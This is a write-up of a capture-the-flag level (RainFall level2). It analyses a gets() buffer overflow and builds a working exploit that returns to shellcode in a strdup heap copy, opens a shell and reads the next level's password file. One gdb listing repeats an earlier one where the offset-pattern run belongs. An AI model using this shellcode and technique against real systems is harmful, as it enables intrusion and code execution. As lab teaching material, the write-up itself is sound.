Here is the program executed with ltrace:

```shell
level2@RainFall:~$ ltrace ./level2 
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                               = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5test
)    = 0xbffff70c
puts("test"test
)                                     = 5
strdup("test")                                   = 0x0804a008
```

Disassembled version of the program:

```assembly
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    

Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
```

Decompiled code (ghidra) from an online decompiler (https://dogbolt.org/):

```c
void p(void)
{
  uint unaff_retaddr;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    // WARNING: Subroutine does not return
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}

void main(void)
{
  p();
  return;
}
```

When a 100-character long string is entered, we can see that EIP is overwritten:

```shell
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/sleleu/Documents/cursus/Rainfall/level2/level2 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Let's try to determine exactly how many characters it takes to overwrite EIP using https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/:

```shell
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/sleleu/Documents/cursus/Rainfall/level2/level2 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

I obtain an offset of 80. Therefore, if I create a string of 80 characters + ABCD, we find EIP rewritten with the characters ABCD:

```shell
Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
```

Here are the ESP addresses:

```shell
(gdb) x/20x $esp
0xbffff6c0:	0xbffff6dc	0x00000000	0x00000000	0xb7e5ec73
0xbffff6d0:	0x080482b5	0x00000000	0x00000000	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x08040041
```

I will attempt to redirect EIP to a shellcode. However, if I try to return the address from the beginning of the buffer in the stack, the program simply exit :

```shell
level2@RainFall:~$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90" * 52 + "\xdc\xf6\xff\xbf"';cat) | ./level2 
(0xbffff6dc)
```

The reason is this check, which prevents us from returning a stack address into EIP:

```c
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    // WARNING: Subroutine does not return
    _exit(1);
  }
```

However, towards the end of the code, there's a malloc for this buffer. strdup returns the address of the string allocated in the heap, the return address obtained previously with ltrace. Therefore, I can enter this address into EIP, which will allow bypassing the check.

So here's the payload, containing the shellcode (https://shell-storm.org/shellcode/files/shellcode-811.html), and the buffer padding of 76 bytes as well as the 4-byte EBP address, totaling 28 + 52 = 80 bytes, and finally the return address to the string in the heap:

```shell
(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08"';cat) | ./level2
```

As a result, I can retrieve the flag:

```shell
level2@RainFall:~$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08"';cat) | ./level2 
1�Ph//shh/bin����°
                  1�@̀�����������������������������������������������
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
